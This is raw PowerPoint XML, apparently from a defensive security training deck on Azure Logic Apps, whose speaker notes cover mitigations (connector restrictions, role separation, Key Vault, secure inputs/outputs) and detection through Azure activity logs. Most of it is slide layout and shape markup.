            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1716918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top three controls have the most impact. Azure Policy to restrict connector types prevents the HTTP exfiltration action entirely. Separating Logic App Contributor from Managed Identity Operator prevents the privilege escalation chain. Key Vault for secrets eliminates the exposure of sensitive values in workflow definitions and run history. Secure inputs/outputs should be enabled on any action that handles secrets, tokens, or PII. In the lab, students will review a Logic App's run history and see how secure inputs/outputs change the visibility of sensitive data.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>24</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="17531764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Summarize the three attack vectors and their detection signals. Emphasize that Logic App abuse is often missed because organizations focus on identity-layer monitoring and overlook resource-layer attacks. The AzureActivity table is the key - all control plane operations are logged there. Encourage students to run the first-time callers query in their production environments as a quick win. Module 04 continues the resource-layer theme with Azure Storage attacks.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>25</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33322955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Summarize the three attack vectors and their detection signals. Emphasize that Logic App abuse is often missed because organizations focus on identity-layer monitoring and overlook resource-layer attacks. The AzureActivity table is the key - all control plane operations are logged there. Encourage students to run the first-time callers query in their production environments as a quick win. Module 04 continues the resource-layer theme with Azure Storage attacks.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>26</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18504084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Logic Apps security documentation is comprehensive. The "Secure Access" page covers trigger access restrictions, input/output obfuscation, and managed identity configuration. The Azure Policy documentation shows how to block specific connector types at the policy level. Encourage students to review the managed identity authentication documentation and implement least-privilege RBAC in their environments.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>27</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41849741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jpe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1.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image27.jpeg"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image26.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 Title">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9" name="Picture 8" descr="Icon&#10;&#10;Description automatically generated">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CB6D3FA3-C210-4270-964A-C6A0069D59E2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="invGray">
          <a:xfrm>
            <a:off x="4671100" y="0"/>
            <a:ext cx="7520900" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33992110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mprehensiveness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4586D2A5-469B-42D5-B926-C4EE6716E87F}"/>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27408632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I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F7A52431-DCFD-473D-980B-E667BAC2F19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34195301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icity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3" name="Graphic 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AAD66E76-E933-412A-9841-907EA78433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6731000" y="0"/>
            <a:ext cx="5461000" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37481063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urity 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2240"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224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0D5D4CBA-07EB-4CCF-BEB7-6F3185DCC670}"/>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5705148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9" name="Graphic 18">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3FBDEDB6-A84F-40BC-B54B-238AED6B04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invGray">
          <a:xfrm>
            <a:off x="4393915" y="0"/>
            <a:ext cx="7798085" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Freeform: Shape 24">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{72B44542-6FEA-4633-9FA4-2E7E2381276D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="17674506">
            <a:off x="10794396" y="4611776"/>
            <a:ext cx="635802" cy="2665253"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="connsiteX0" fmla="*/ 610820 w 635802"/>
              <a:gd name="connsiteY0" fmla="*/ 194160 h 2665253"/>
              <a:gd name="connsiteX1" fmla="*/ 635802 w 635802"/>
              <a:gd name="connsiteY1" fmla="*/ 317901 h 2665253"/>
              <a:gd name="connsiteX2" fmla="*/ 635802 w 635802"/>
              <a:gd name="connsiteY2" fmla="*/ 2374494 h 2665253"/>
              <a:gd name="connsiteX3" fmla="*/ 0 w 635802"/>
              <a:gd name="connsiteY3" fmla="*/ 2665253 h 2665253"/>
              <a:gd name="connsiteX4" fmla="*/ 0 w 635802"/>
              <a:gd name="connsiteY4" fmla="*/ 317901 h 2665253"/>
              <a:gd name="connsiteX5" fmla="*/ 317901 w 635802"/>
              <a:gd name="connsiteY5" fmla="*/ 0 h 2665253"/>
              <a:gd name="connsiteX6" fmla="*/ 610820 w 635802"/>
              <a:gd name="connsiteY6" fmla="*/ 194160 h 266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802" h="2665253">
                <a:moveTo>
                  <a:pt x="610820" y="194160"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="626906" y="232193"/>
                  <a:pt x="635802" y="274008"/>
                  <a:pt x="635802" y="317901"/>
                </a:cubicBezTo>
                <a:lnTo>
                  <a:pt x="635802" y="2374494"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="2665253"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="317901"/>
                </a:lnTo>
                <a:cubicBezTo>
                  <a:pt x="-1" y="142329"/>
                  <a:pt x="142328" y="0"/>
                  <a:pt x="317901" y="0"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="449580" y="0"/>
                  <a:pt x="562559" y="80060"/>
                  <a:pt x="610820" y="194160"/>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 name="Freeform: Shape 20">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F3335884-C023-4224-A943-917B878BC8D4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4410930" y="0"/>
            <a:ext cx="3165243" cy="1270495"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="connsiteX0" fmla="*/ 0 w 3165243"/>
              <a:gd name="connsiteY0" fmla="*/ 0 h 1270495"/>
              <a:gd name="connsiteX1" fmla="*/ 1528791 w 3165243"/>
              <a:gd name="connsiteY1" fmla="*/ 0 h 1270495"/>
              <a:gd name="connsiteX2" fmla="*/ 2979476 w 3165243"/>
              <a:gd name="connsiteY2" fmla="*/ 663413 h 1270495"/>
              <a:gd name="connsiteX3" fmla="*/ 3136370 w 3165243"/>
              <a:gd name="connsiteY3" fmla="*/ 1084728 h 1270495"/>
              <a:gd name="connsiteX4" fmla="*/ 2715055 w 3165243"/>
              <a:gd name="connsiteY4" fmla="*/ 1241622 h 1270495"/>
              <a:gd name="connsiteX5" fmla="*/ 0 w 3165243"/>
              <a:gd name="connsiteY5" fmla="*/ 0 h 1270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5243" h="1270495">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1528791" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2979476" y="663413"/>
                </a:lnTo>
                <a:cubicBezTo>
                  <a:pt x="3139144" y="736431"/>
                  <a:pt x="3209388" y="925060"/>
                  <a:pt x="3136370" y="1084728"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="3063352" y="1244396"/>
                  <a:pt x="2874723" y="1314640"/>
                  <a:pt x="2715055" y="1241622"/>
                </a:cubicBezTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:ln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6153071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dentity and Access Management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E8C58369-026C-4974-B869-BE8D4ADCB870}"/>
              </a:ext>
              <a:ext uri="{C183D7F6-B498-43B3-948B-1728B52AA6E4}">
                <adec:decorative xmlns:adec="http://schemas.microsoft.com/office/drawing/2017/decorative" val="1"/>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75" r="-18"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="invGray">
          <a:xfrm>
            <a:off x="7076792" y="0"/>
            <a:ext cx="5115208" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="11168812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 Title square photo placehol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861522-4B83-496F-B783-60079A7F201B}"/>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3" name="Picture 12">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ED2EF16D-D401-4DD1-BD2B-1417889AD2A5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="582043" y="585788"/>
            <a:ext cx="2308795" cy="294139"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>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1F9ED9A-FBBB-45FF-A5CF-ED4786662DCE}"/>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0628565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quare photo placeholder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8" name="Group 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{64913CEA-C43B-4E3B-AE2A-5F44288BCBBB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="black">
          <a:xfrm>
            <a:off x="582043" y="585788"/>
            <a:ext cx="2308795" cy="294139"/>
            <a:chOff x="582043" y="585788"/>
            <a:chExt cx="2308795" cy="294139"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="9" name="Picture 8">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{323B6B2C-935A-48E1-9234-20A9CF488160}"/>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10" name="Picture 9">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BB5C68CB-B9DE-4230-A702-903A205A042A}"/>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1" name="Rectangle 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7F05E9DA-E8D1-4172-820D-CEE3065C0EFC}"/>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2A3946FB-3CEF-4A23-BE32-5CA90CBB4988}"/>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1440840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quare photo placeholder Yellow">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:srgbClr val="FFB9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Picture 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2B7938B8-F298-4772-A6EC-8F59C02C0B8A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="581337" y="585788"/>
            <a:ext cx="2308796" cy="294587"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C9B633B0-40F9-4729-84DB-771120F5D70D}"/>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E0F96359-EC4C-4CE6-BA65-F486272055DA}"/>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4197959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quare photo placeholder Green">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:srgbClr val="107C1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4648555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quare Photo placeholder Dk Blu">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64189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quare photo placeholder Dk Green">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:srgbClr val="054B1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036985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18741588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5215637" cy="553998"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Agenda</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0614E108-2258-4959-A182-798030A0C286}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6395722" y="0"/>
            <a:ext cx="5796278"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2" name="Group 31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{22E07E8F-16B4-4F77-8278-6A843F1B9F57}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="16200000">
            <a:off x="7643952" y="2603639"/>
            <a:ext cx="5424211" cy="3084509"/>
            <a:chOff x="6395721" y="4420906"/>
            <a:chExt cx="3250001" cy="1848132"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="27" name="Rectangle: Top Corners Rounded 26">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B26B5DC7-3928-4E30-95C7-101CC42758F9}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="5400000">
              <a:off x="6879140" y="3937487"/>
              <a:ext cx="501648" cy="1468485"/>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 name="Oval 24">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6F2E0A55-6A95-45A9-9988-FD4377975EAD}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="7407431" y="4471065"/>
              <a:ext cx="401326" cy="40132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 name="Rectangle: Top Corners Rounded 27">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EA3F14D9-33C3-411A-8D84-8E8E15E9381B}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="5400000">
              <a:off x="7246261" y="4243608"/>
              <a:ext cx="501648" cy="2202728"/>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Oval 28">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4A285CB0-5ABD-4C59-98FE-F25F8026D321}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="8141673" y="5144307"/>
              <a:ext cx="401326" cy="401326"/>
            </a:xfrm>
            <a:prstGeom prst="ellipse">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 name="Rectangle: Top Corners Rounded 29">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6EC31BC0-C04D-4163-9ECB-371CBCE34ADB}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="5400000">
              <a:off x="7769898" y="4393213"/>
              <a:ext cx="501648" cy="3250001"/>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 name="Oval 30">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E691BBA6-17F1-4715-BBD9-9570E0AF6EBF}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="9188946" y="5817549"/>
              <a:ext cx="401326" cy="401326"/>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spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="144995267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3FA96-19FC-48A6-A985-267EB2138E23}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="120898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bg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CCCF4131-8CCF-4171-B985-EAF865CC55EF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="10798157" y="457199"/>
            <a:ext cx="1100156" cy="564349"/>
            <a:chOff x="9946913" y="171645"/>
            <a:chExt cx="1656824" cy="849904"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="6" name="Graphic 4">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{494D7464-294F-4164-ACF7-0EDEA0812105}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="994691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5" name="Graphic 4">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8773D37F-9426-48AF-9E30-19EA4A3E4F07}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="10689786" y="171645"/>
              <a:ext cx="521445"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6" name="Graphic 4">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{26D5F151-C3B9-4DC3-A552-E8B16BA82E44}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1108229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373206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3442297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744166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9247365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75334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220087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989941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4105195"/>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238927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86950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653108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157698633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4539929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6796536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5173131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5449408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2669952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8659946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97630004"/>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3017400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3928835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029678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892726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46252696"/>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2318116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6124816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5067878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4718592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0362425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35328269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7088947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215533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6885394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9101558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8395676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02496145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371262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507205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04172553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30088523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yellow">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5384"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6" name="Picture 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DD6A131B-0EEE-4C13-90D1-99AA5B3DC4ED}"/>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584200" y="1201415"/>
            <a:ext cx="2062492" cy="1842493"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="24045622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26008291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mo slid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6642325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emo slid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616054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mo slid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8476064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Demo slide Dk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8478032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_Demo slid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1026960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ection Titl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553930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Section Title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8391310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2_Section Title blue">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5032584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Titl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8033352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Titl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5326027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Section Title Dk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4898367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Section Titl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097217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title - Threat dete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1B2F99-8E84-6040-8D67-9859BF2580C4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5270500" y="0"/>
            <a:ext cx="6921500"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57AA630A-F1CE-3240-9874-C76F0B95FC3C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6197533" y="1064712"/>
            <a:ext cx="5024048" cy="4379659"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34258508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title - Comprehensive secur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85634B7-7348-3D4C-884C-574DBB5ACD92}"/>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44097A09-7943-5649-B860-0C242F6430E1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2"/>
          <a:srcRect l="12404" r="9346"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5270501" y="1315232"/>
            <a:ext cx="6921500" cy="4238669"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41645751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title - End-to-end security visibilit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E5BB7F-3132-5D4C-AB53-07BD308F7C71}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5270500" y="0"/>
            <a:ext cx="6921500" cy="6858000"/>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8" name="Picture 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1AC60BDD-CABB-8B4F-BFDB-1AAA8A20164C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2"/>
          <a:srcRect l="8828" r="8209"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5270500" y="2322164"/>
            <a:ext cx="6921500" cy="2294285"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
